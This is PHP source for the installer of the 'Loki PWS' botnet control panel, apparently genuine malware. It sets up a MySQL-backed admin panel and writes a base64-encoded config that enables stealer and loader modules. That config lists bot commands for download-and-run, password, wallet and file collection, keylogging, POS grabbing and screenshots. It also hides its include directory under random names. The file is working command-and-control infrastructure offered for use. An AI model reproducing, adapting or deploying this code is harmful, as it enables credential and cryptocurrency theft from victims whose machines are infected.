<?php 
	if(!defined('IN_LOKI')) die("File not found.");
	
	$Modules_ = array(
	
		array("mysqli_connect", "MySQLi", "apt-get install php5-mysql(i) / yum install php-mysqli"),
		array("mcrypt_encrypt", "Mcrypt", "apt-get install php5-mcrypt / yum install php-mcrypt"),
		//array("sqlite_open", "Sqlite", "apt-get install php5-sqlite / yum install php-sqlite"),
		array("gd_info", "GD", "apt-get install php5-gd / yum install php-gd"),
		array("gmp_mul", "GMP", "apt-get install php5-gmp / yum install php-gmp")	
	);
	
	$bMissing = FALSE;
	
	foreach ($Modules_ as $Element)
	{
		if (!function_exists($Element[0])) 
		{
			echo "$Element[1] extension not loaded.\n";
			echo "$Element[2]\n";
			
			$bMissing = TRUE;
		}	
	}

	if($bMissing)
		die();
	
	error_reporting(NULL);
?>
<!DOCTYPE html>
<html>
	<head>
		<meta http-equiv="content-type" content="text/html; charset=UTF-8">
		<title>Install</title>
	</head>
	<body>
<style>
    .ab{
        margin: auto;
        position: absolute;
        top: -200px;
        left: 0;
        bottom: 0;
        right: 0;
    }
    .ab.is {
        width: 50%;
        height: 50%;
        min-width: 200px;
        max-width: 400px;
        padding: -20px;
    }
 
</style>
<script type="text/javascript">
<!--
    function SetVisibility(ElementID) 
	{
       var Element = document.getElementById(ElementID);
       if(Element.style.display == 'block')
          Element.style.display = 'none';
       else
          Element.style.display = 'block';
    }
function PasswordCheck(Pass1, Pass2)
{
	var Result = true;
	
    if (Pass1 != Pass2)
    {
        alert('Password don\'t match!');
        Result = false;
    }
	
    if (Pass1.length < 5)
    {
        alert('Password too short!');
        Result = false;
    }
	
    return Result;
}
</script>
<?php
	$ConfigBuffer = 'PD9waHANCglpZiAoYmFzZW5hbWUoJF9TRVJWRVJbJ1BIUF9TRUxGJ10pID09IGJhc2VuYW1lKF9fRklMRV9fKSkgZGllKCJGaWxlIG5vdCBmb3VuZC4iKTsNCg0KCUBkYXRlX2RlZmF1bHRfdGltZXpvbmVfc2V0KCdFdXJvcGUvTWluc2snKTsNCglAc2V0X3RpbWVfbGltaXQoTlVMTCk7DQoJQGluaV9zZXQoJ21heF9leGVjdXRpb25fdGltZScsIE5VTEwpOw0KDQoJJERCRGF0YSA9IGFycmF5DQoJKA0KCQknaG9zdG5hbWUnID0+ICI8TVlTUUxIT1NUPiIsDQoJCSd1c2VybmFtZScgPT4gIjxNWVNRTFVTRVI+IiwNCgkJJ3Bhc3N3b3JkJyA9PiAiPE1ZU1FMUEFTUz4iLA0KCQknZGF0YWJhc2UnID0+ICI8TVlTUUxEQj4iLA0KCQkncG9ydCcgCSAgID0+IDxNWVNRTFBPUlQ+LA0KCQkncHJlZml4JyAgID0+ICI8TVlTUUxQUkVGSVg+IiwNCgkJJ2Flc19rZXknICA9PiAwLA0KCSk7DQoJDQoJZGVmaW5lKCJJTl9MT0tJIiwgCQlUUlVFKTsNCgkNCglkZWZpbmUoIkxBTkdfREIiLCAJCSJsYW5nLmRiLnBocCIpOw0KCWRlZmluZSgiVElUTEUiLCAJCSJMb2tpIFBXUyIpOw0KCQ0KCWRlZmluZSgiTEFOR18iLCAJCSJlbiIpOw0KCWRlZmluZSgiRTQwNF8iLCAJCSJGaWxlIG5vdCBmb3VuZC4iKTsNCgkNCglkZWZpbmUoIkRFQlVHXyIsCQlUUlVFKTsNCglkZWZpbmUoIkNBUFRDSEEiLCAJCTxVU0VDQVBUQ0hBPik7DQoJZGVmaW5lKCJBVVRIX1VSTCIsIAkJPFVTRVVSTD4pOw0KCWRlZmluZSgiQVVUSF9BR0VOVCIsIAk8VVNFQUdFTlQ+KTsNCgkNCglkZWZpbmUoIlRFTVBfIiwgCQkiPFRNUERJUj4iKTsNCglkZWZpbmUoIlVSTF8iLCAJCQkiPFVSTD4iKTsNCglkZWZpbmUoIkFHRU5UXyIsIAkJIjxBR0VOVD4iKTsNCglkZWZpbmUoIklOQ0xVREVfIiwgCQkiPElOQ0xVREU+Iik7DQoJZGVmaW5lKCJXQUxMRVRfIiwgCQkiPFdFQktFWT4iKTsNCglkZWZpbmUoIkVOQ0tFWV8iLCAJCSI8RklMRUtFWT4iKTsNCglkZWZpbmUoIkNPT0tJRV8iLCAJCSI8Q09PS0lFPiIpOw0KCWRlZmluZSgiRVhURU5TSU9OXyIsIAkiLnR4dCIpOw0KCQ0KCWRlZmluZSgiQUNUVkFMVUVfIiwgCSI8UkFORDE+Iik7DQoJZGVmaW5lKCJPUFRWQUxVRV8iLCAJIjxSQU5EMj4iKTsNCglkZWZpbmUoIkFVVEhWQUxVRV8iLCAJIjxSQU5EMz4iKTsNCgkNCglkZWZpbmUoIk1PRFVMRV9TVEVBTEVSIiwJCTxTVEVBTEVSPik7DQoJZGVmaW5lKCJNT0RVTEVfTE9BREVSIiwJCQk8TE9BREVSPik7DQoJZGVmaW5lKCJNT0RVTEVfV0FMTEVUIiwJCQk8V0FMTEVUPik7DQoJZGVmaW5lKCJNT0RVTEVfRklMRV9HUkFCQkVSIiwJPEZJTEVHUkFCQkVSPik7DQoJZGVmaW5lKCJNT0RVTEVfU1RSRVNTRVIiLAkJPFNUUkVTU0VSPik7DQoJZGVmaW5lKCJNT0RVTEVfUE9TX0dSQUJCRVIiLAk8UE9TR1JBQkJFUj4pOw0KCWRlZmluZSgiTU9EVUxFX0tFWUxPR0dFUiIsCQk8S0VZTE9HR0VSPik7DQoJZGVmaW5lKCJNT0RVTEVfU0NSRUVOU0hPVCIsCQk8U0NSRUVOU0hPVD4pOw0KCQ0KCWlmKERFQlVHXykNCgl7DQoJCUBpbmlfc2V0KCdkaXNwbGF5X2Vycm9ycycsJ09uJyk7DQoJCUBpbmlfc2V0KCdlcnJvcl9yZXBvcnRpbmcnLCBFX0FMTCk7DQoJfQ0KCWVsc2UNCgl7DQoJCUBpbmlfc2V0KCdkaXNwbGF5X2Vycm9ycycsJ09mZicpOw0KCQlAaW5pX3NldCgnZXJyb3JfcmVwb3J0aW5nJywgTlVMTCk7DQoJfQ0KCQ0KDQoJJFdoaXRlX0JvdEFnZW50c19MaXN0cyA9IGFycmF5ICgiTW96aWxsYS80LjA4IChDaGFyb247IEluZmVybm8pIik7DQoJJFdoaXRlX0xpc3RzID0gYXJyYXkoKTsNCg0KCSRMYW5nCQkgPSBMQU5HXzsNCgkkUGFnZUxpbWl0REIgPSBhcnJheSAoIDEwLCAyMCwgMzAsIDUwLCAxMDApOyANCgkkUGFnZUxpbWl0IAkgPSAxMDsNCgkkUGFnZUlEICAgIAkgPSAxOw0KDQoJJFByaXZpbGVnZXNEQiA9IGFycmF5IA0KCSgNCgkJMCA9PiAnUmVhZCwgRXhwb3J0LCBEZWxldGUsIFNldHRpbmdzLCAuLiAoQUxMKScsIA0KCQkxID0+ICdSZWFkLCBFeHBvcnQsIERlbGV0ZScNCgkpOw0KCQ0KCSRDb21tYW5kc0RCID0gYXJyYXkgDQoJKA0KCQkwID0+ICdEb3dubG9hZCAmIFJ1bicsIA0KCQkxID0+ICdEb3dubG9hZCAmIExvYWQnLA0KCQkyID0+ICdEb3dubG9hZCAmIERyb3AnLA0KCQkzID0+ICctJywNCgkJOCAgPT4gJ1JlbW92ZSBIYXNoIERCJywNCgkJOSAgPT4gJ0VuYWJsZSBLZXlsb2dnZXInLA0KCQkxMCA9PiAnQ29sbGVjdCBQYXNzd29yZCcsDQoJCTExID0+ICdDb2xsZWN0IFdhbGxldCcsDQoJCTEyID0+ICdDb2xsZWN0IEZpbGUnLA0KCQkxMyA9PiAnQ29sbGVjdCBCaW4vRHVtcCcsDQoJCQ0KCQkxNCA9PiAnU2h1dGRvd24gQm90IChPbmx5IEJvdCwgbm90IFBDKScsDQoJCTE1ID0+ICdVcGRhdGUgQm90JywNCgkJMTYgPT4gJ1VwZGF0ZSByZWNvbm5lY3QgaW50ZXJ2YWxsJywNCgkJMTcgPT4gJ1VuaW5zdGFsbCBCb3QnLA0KCQkxOCA9PiAnU2NyZWVuc2hvdCcsDQoJKTsNCgkNCgkkUGFnZSA9IGFycmF5KCk7DQoJDQoJaWYoTU9EVUxFX0xPQURFUikNCgl7DQoJCWlmKCFNT0RVTEVfU1RSRVNTRVIpDQoJCQl1bnNldCgkQ29tbWFuZHNEQlszXSk7DQoJCWlmKCFNT0RVTEVfRklMRV9HUkFCQkVSKQ0KCQkJdW5zZXQoJENvbW1hbmRzREJbMTJdKTsNCgkJaWYoIU1PRFVMRV9QT1NfR1JBQkJFUikNCgkJCXVuc2V0KCRDb21tYW5kc0RCWzEzXSk7DQoJCWlmKCFNT0RVTEVfS0VZTE9HR0VSKQ0KCQkJdW5zZXQoJENvbW1hbmRzREJbMTBdKTsNCgkJDQoJCSRQYWdlID0gYXJyYXkNCgkJKA0KCQkJYXJyYXkoIm1haW4iLCAiTWFpbiIpLA0KCQkJYXJyYXkoIiAiLCAiQm90cyIsIA0KCQkJCWFycmF5KA0KCQkJCQlhcnJheSgiYm90IiwgIkJvdHMiKSwgDQoJCQkJCWFycmF5KCIgIiwgImRpdmlkZXIiKSwgDQoJCQkJCWFycmF5KCJjb21tYW5kIiwgIkNvbW1hbmRzIikNCgkJCQkpKSwNCgkJCQkNCgkJCWFycmF5KCIgIiwgIlJlcG9ydHMiLCANCgkJCQlhcnJheSgNCgkJCQkJYXJyYXkoInJlcG9ydCIsICJSZXBvcnRzIiksDQoJCQkJCWFycmF5KCIgIiwgImRpdmlkZXIiKSwNCgkJCQkJYXJyYXkoImh0dHAiLCAiSFRUUCIpLCANCgkJCQkJYXJyYXkoImZ0cCIsICJGVFAvU1NIIiksIA0KCQkJCQlhcnJheSgib3RoZXIiLCAiT3RoZXJzIiksIA0KCQkJCQlhcnJheSgid2FsbGV0IiwgIldhbGxldCIpLA0KCQkJCQlhcnJheSgiZHVtcCIsICJEdW1wcyIpDQoJCQkJKSksDQoJCQkJDQoJCQlhcnJheSgic2V0dGluZ3MiLCAiU2V0dGluZ3MiKSwgDQoJCQlhcnJheSgiZXhpdCIsICJFeGl0IikNCgkJKTsNCgkJDQoJCWlmKCFNT0RVTEVfU1RFQUxFUikNCgkJew0KCQkJdW5zZXQoJFBhZ2VbMl1bMl1bMl0pOw0KCQkJdW5zZXQoJFBhZ2VbMl1bMl1bM10pOw0KCQkJdW5zZXQoJFBhZ2VbMl1bMl1bNF0pOw0KCQkJdW5zZXQoJENvbW1hbmRzREJbMTBdKTsNCgkJfQ0KCQlpZighTU9EVUxFX1dBTExFVCkNCgkJew0KCQkJdW5zZXQoJENvbW1hbmRzREJbMTFdKTsNCgkJCXVuc2V0KCRQYWdlWzJdWzJdWzVdKTsNCgkJfQ0KCQlpZighTU9EVUxFX1NDUkVFTlNIT1QpDQoJCQl1bnNldCgkQ29tbWFuZHNEQlsxOF0pOw0KCQlpZighTU9EVUxFX1BPU19HUkFCQkVSKQ0KCQkJdW5zZXQoJFBhZ2VbMl1bMl1bNl0pOw0KCX0NCgllbHNlDQoJew0KCQkkUGFnZSA9IGFycmF5DQoJCSgNCgkJCWFycmF5KCJtYWluIiwgIk1haW4iKSwgDQoJCQlhcnJheSgiaHR0cCIsICJIVFRQIiksIA0KCQkJYXJyYXkoImZ0cCIsICJGVFAvU1NIIiksDQoJCQlhcnJheSgib3RoZXIiLCAiT3RoZXJzIiksDQoJCQlhcnJheSgid2FsbGV0IiwgIldhbGxldCIpLA0KCQkJYXJyYXkoImR1bXBzIiwgIkR1bXBzIiksDQoJCQlhcnJheSgicmVwb3J0IiwgIlJlcG9ydHMiKSwNCgkJCWFycmF5KCJzZXR0aW5ncyIsICJTZXR0aW5ncyIpLCANCgkJCWFycmF5KCJleGl0IiwgIkV4aXQiKQ0KCQkpOw0KCQkNCgkJaWYoIU1PRFVMRV9TVEVBTEVSKQ0KCQl7DQoJCQl1bnNldCgkUGFnZVsxXSk7DQoJCQl1bnNldCgkUGFnZVsyXSk7DQoJCQl1bnNldCgkUGFnZVszXSk7DQoJCQkNCgkJCXVuc2V0KCRDb21tYW5kc0RCWzEwXSk7DQoJCX0NCgkJDQoJCWlmKCFNT0RVTEVfUE9TX0dSQUJCRVIpDQoJCQl1bnNldCgkUGFnZVs1XSk7DQoJCQ0KCQlpZighTU9EVUxFX1dBTExFVCkNCgkJCXVuc2V0KCRQYWdlWzRdKTsNCgl9DQo/Pg0K';
	
	if(isset($_REQUEST['acti']) && trim($_REQUEST['acti']) == 'install')
	{
			if(isset($_REQUEST['MHost']) && !file_exists($Config))
			{
				$MySQLHost 	 = trim($_REQUEST['MHost']);
				$MySQLUser 	 = trim($_REQUEST['MUser']);
				$MySQLPass 	 = trim($_REQUEST['MPass']);
				$MySQLDB  	 = trim($_REQUEST['MDatabase']);
				$MySQLPrefix = trim($_REQUEST['MPrefix']);
				$MySQLPort	 = trim($_REQUEST['MPort']);
				$UseAgent 	 = 'FALSE';
				$UseUrl 	 = 'FALSE';
				$AuthAgent 	 = '';
				$AuthUrl 	 = '';
				$Username = trim($_REQUEST['MPrefix']);
				$Password = trim($_REQUEST['MPort']);
				if(isset($_REQUEST['UseAgent']) && trim($_REQUEST['UseAgent']) == 'on')
				{
					$AuthAgent = trim($_REQUEST['UserAgent']);
					$UseAgent  = 'TRUE';
				}
				if(isset($_REQUEST['UseUrl']) && trim($_REQUEST['UseUrl']) == 'on')
				{
					$AuthUrl = MakeRandomString(11, TRUE);
					$UseUrl  = 'TRUE';
				}
				
				if(!strlen($MySQLPort))
					$MySQLPort = 0;
				
				if(!strlen($MySQLPrefix))
					$MySQLPrefix = MakeRandomString(4, TRUE);
				
				$ConfigBuffer = base64_decode($ConfigBuffer);
				$ConfigBuffer = str_replace("<LANG>", "en", $ConfigBuffer);
				$ConfigBuffer = str_replace("<MYSQLHOST>", $MySQLHost, $ConfigBuffer);
				$ConfigBuffer = str_replace("<MYSQLUSER>", $MySQLUser, $ConfigBuffer);
				$ConfigBuffer = str_replace("<MYSQLPASS>", $MySQLPass, $ConfigBuffer);
				$ConfigBuffer = str_replace("<MYSQLPORT>", intval($MySQLPort), $ConfigBuffer);
				$ConfigBuffer = str_replace("<MYSQLDB>", $MySQLDB, $ConfigBuffer);
				$ConfigBuffer = str_replace("<MYSQLPREFIX>", $MySQLPrefix, $ConfigBuffer);
				$ConfigBuffer = str_replace("<USEAGENT>", $UseAgent, $ConfigBuffer);
				
				$ConfigBuffer = str_replace("<USECAPTCHA>", "1", $ConfigBuffer);
				$ConfigBuffer = str_replace("<USEURL>", $UseUrl, $ConfigBuffer);
				
				$ConfigBuffer = str_replace("<AGENT>", $AuthAgent, $ConfigBuffer);
				$ConfigBuffer = str_replace("<COOKIE>", MakeRandomString(8, TRUE), $ConfigBuffer);
				$TmpName = MakeRandomString(7, TRUE);
				$ConfigBuffer = str_replace("<TMPDIR>", $TmpName, $ConfigBuffer);
				$Include = MakeRandomString(7, TRUE);
				$ConfigBuffer = str_replace("<INCLUDE>", $Include, $ConfigBuffer);
				$ConfigBuffer = str_replace("<FILEKEY>", MakeRandomString(7, TRUE), $ConfigBuffer);
				$WebKey = MakeRandomString(15, TRUE);
				$ConfigBuffer = str_replace("<WEBKEY>", $WebKey, $ConfigBuffer);
				
				$AuthLink = MakeRandomString(4, TRUE);
				
				$ConfigBuffer = str_replace("<RAND1>", MakeRandomString(4, TRUE), $ConfigBuffer);
				$ConfigBuffer = str_replace("<RAND2>", MakeRandomString(4, TRUE), $ConfigBuffer);
				$ConfigBuffer = str_replace("<RAND3>", $AuthLink, $ConfigBuffer);
				
				$ConfigBuffer = str_replace("<URL>", $AuthUrl, $ConfigBuffer);
				
				$ConfigBuffer = str_replace("<LOADER>", "1", $ConfigBuffer);
				$ConfigBuffer = str_replace("<WALLET>", "0", $ConfigBuffer);
				$ConfigBuffer = str_replace("<STEALER>", "1", $ConfigBuffer);
				$ConfigBuffer = str_replace("<FILEGRABBER>", "0", $ConfigBuffer);
				$ConfigBuffer = str_replace("<STRESSER>", "0", $ConfigBuffer);
				$ConfigBuffer = str_replace("<POSGRABBER>", "0", $ConfigBuffer);
				$ConfigBuffer = str_replace("<KEYLOGGER>", "0", $ConfigBuffer);
				$ConfigBuffer = str_replace("<SCREENSHOT>", "0", $ConfigBuffer);
				
				$LokiDBCon = new LokiDB($MySQLHost, $MySQLUser, $MySQLPass, $MySQLDB, $MySQLPort,  $MySQLPrefix, TRUE, TRUE);
				
				$LokiDBCon->AddNewUser($_REQUEST['iUa'], $_REQUEST['iPa'], 0);
				
				if(!file_exists ($TmpName))
					mkdir(getcwd() . "/" . $TmpName, 0755, true);
					
				if(file_put_contents($Config, $ConfigBuffer))
					chmod($Config, 0644);
				else
				{
					ob_clean();
					print '<pre>';
					if(!rename (getcwd() . "/inc", getcwd() . "/" .$Include))
						echo "Please rename Inc Directory from Inc to $Include. (mv " . getcwd() . "/inc " . getcwd() . "/" .$Include.")\n";
					
					if(!unlink (__FILE__))
						echo "Please delete: " . __FILE__." (rm -rf ".__FILE__.")\n";
					
					print "Username: ".trim($_REQUEST['iUa'])."\n";
					print "Password: ".trim($_REQUEST['iPa'])."\n";
					print "Web Key: " . trim($WebKey) . " (Coin Inspector)\n";
					print "Temp Dir: " . getcwd() . "/" . $TmpName . "\n";
					if(isset($_REQUEST['UseAgent']) && trim($_REQUEST['UseAgent']) == 'on')
						print "Useragent: ".$AuthAgent."\n";
					
					print 'Can\'t write Config file. To continue, please put this to config ('.$Config.') file, then reload this page.<br/><br/>';
					print '</pre>';
					highlight_string( $ConfigBuffer);
					die();
				}
				ob_clean();
				print '<pre>';
				if(!rename (getcwd() . "/inc", getcwd() . "/" .$Include))
					echo "Please rename Inc Directory from Inc to $Include. (mv " . getcwd() . "/inc " . getcwd() . "/" .$Include.")\n";
				
				if(!unlink (__FILE__))
					echo "Please delete: " . __FILE__." (rm -rf ".__FILE__.")\n";
					
				print '<pre>';
				$ScriptName  = $_SERVER['SCRIPT_NAME'];
				$Server   	 = $_SERVER['HTTP_HOST'];
				$UserAgent   = $_SERVER['HTTP_USER_AGENT'];
				$ScriptURL	 = $Protocol . $Server . $ScriptName;
	
				
				print "Username: ".trim($_REQUEST['iUa'])."\n";
				print "Password: ".trim($_REQUEST['iPa'])."\n";
				print " Web Key: " . trim($WebKey) . " (Coin Inspector)\n";
				print "Temp Dir: " . getcwd() . "/" . $TmpName . " (if directory not writable, many function not working! (chmod 644 ".getcwd() . "/" . $TmpName."))\n";
				if(isset($_REQUEST['UseAgent']) && trim($_REQUEST['UseAgent']) == 'on')
					print "Auth Agent: ".$AuthAgent."\n";
				if(isset($_REQUEST['UseUrl']) && trim($_REQUEST['UseUrl']) == 'on')
				{
					$ScriptURL = $ScriptURL."?".$AuthLink ."=" .$AuthUrl;
				}
				
				print "Auth Url: ".$ScriptURL."\n";
					
				print "Istall done! <a href='".$ScriptURL."'>Click here!</a>\n";
				die();
			}
	}
?>

<div class="container">
    <div class="row">
        <div class="ab is">
            <div class="well well-lg" style="height:500px;" align="center">
                <div class="col-sm-12 col-md-10 col-md-offset-1">
                    <form method="POST" class="form-horizontal" action="<?php echo($ScriptURL);?>?acti=install">
					  <fieldset>
						<legend>Install - MySQL, User</legend>
                            <div class="form-group has-feedback">
								<label for="MHost" class="col-lg-2 control-label">Hostname:</label>
								<div class="col-lg-10">
									<input type="text" style="width: 70%;" value="" id="MHost" name="MHost" class="form-control input-sm" />
								</div>
                            </div>
                            <div class="form-group has-feedback">
								<label for="MUser" class="col-lg-2 control-label">Username:</label>
								<div class="col-lg-10">
									<input type="text" style="width: 70%;" value="" id="MUser" name="MUser" class="form-control input-sm" />
								</div>
                            </div>
                            <div class="form-group has-feedback">
								<label for="MPass" class="col-lg-2 control-label">Password:</label>
								<div class="col-lg-10">
									<input type="password" style="width: 70%;" value="" id="MPass" name="MPass" class="form-control input-sm" />
								</div>
                            </div>
                            <div class="form-group has-feedback">
								<label for="MDatabase" class="col-lg-2 control-label">Database:</label>
								<div class="col-lg-10">
									<input type="text" style="width: 70%;" value="" id="MDatabase" name="MDatabase" class="form-control input-sm" />
								</div>
                            </div>
							<div class="form-group has-feedback">
								<a href="#" onclick="SetVisibility('OptionsMysql');"><small>More MySQL options..</small></a>
							</div>
							
							<div id="OptionsMysql" style="display: none;">
								<div class="form-group has-feedback">
									<label for="MPort" class="col-lg-2 control-label">Port:</label>
									<div class="col-lg-10">
										<input type="password" style="width: 70%;" value="" id="MPort" name="MPort" class="form-control input-sm" />
									</div>
								</div>
								<div class="form-group has-feedback">
									<label for="MPrefix" class="col-lg-2 control-label">Prefix:</label>
									<div class="col-lg-10">
										<input type="text" style="width: 70%;" value="" id="MPrefix" name="MPrefix" class="form-control input-sm" />
									</div>
								</div>
							</div>
							
							<div class="form-group has-feedback">
								<div class="checkbox">
									<label><input name="UseUrl"  type="checkbox">Use Auth Url (Random)</label>
								</div>
							</div>
							
							<div class="form-group has-feedback">
								<div class="checkbox">
									<label><input onclick="SetVisibility('UserAgent');" name="UseAgent"  type="checkbox">Use Auth Useragent</label>
								</div>
							</div>
						  
							<div id="UserAgent" style="display: none;">
								<div class="form-group has-feedback">
									<label for="MPort" class="col-lg-2 control-label">Useragent:</label>
									<div class="col-lg-10">
										<input type="password" style="width: 70%;" value="" id="UserAgent" name="UserAgent" class="form-control input-sm" />
									</div>
								</div>
							</div>
							
                            <div style="padding-top: 15px;"class="form-group has-feedback">
								<label for="MUser" class="col-lg-2 control-label">Username:</label>
								<div class="col-lg-10">
									<input type="text" style="width: 70%;" value="" id="iUa" name="iUa" class="form-control input-sm" />
								</div>
                            </div>
                            <div class="form-group has-feedback">
								<label for="MPass" class="col-lg-2 control-label">Password:</label>
								<div class="col-lg-10">
									<input type="password" style="width: 70%;" value="" id="iPa" name="iPa" class="form-control input-sm" />
								</div>
                            </div>
                            <div class="form-group has-feedback">
								<label for="MPass" class="col-lg-2 control-label">Password:</label>
								<div class="col-lg-10">
									<input type="password" style="width: 70%;" value="" id="iPa2" name="iPa2" class="form-control input-sm" />
								</div>
                            </div>
							<button type="submit" onclick="return PasswordCheck(document.getElementById('iPa').value, document.getElementById('iPa2').value); return true;" class="btn-sm btn btn-primary">Install</button>
						</fieldset>	   
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>

